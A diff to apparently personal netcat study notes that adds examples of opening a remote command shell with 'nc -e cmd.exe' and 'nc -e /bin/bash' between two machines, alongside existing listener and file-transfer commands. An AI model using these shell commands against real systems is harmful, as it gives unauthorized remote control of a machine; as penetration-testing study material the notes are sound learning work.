@@ -12,6 +12,13 @@ nc 10.1.2.33 <portnr>
 #listen for a port. the command belove must set on the outgoing machin
 outgoing Machin: nc	-nlvp 4444
 Linsting Machin: nc	‐nv	10.0.0.22	4444
+#When the outgoing machin add the -e parameter then the listening maching can exceute this. thos works in both way
+outgoing Machin: nc	-nlvp 4444 -e cmd.exe
+Linsting Machin: nc	‐nv	10.0.0.22	4444 #-> Now the windows command can be used.
+
+outgoing Machin: nc	-nlvp 4444
+Linsting Machin: nc	‐nv	10.0.0.22	4444 -e /bin/bash # the other direction.
+
 
 # filetransfar example
 Outgoing Machin create a file: >nc ‐nlvp 4444  > incoming.exe
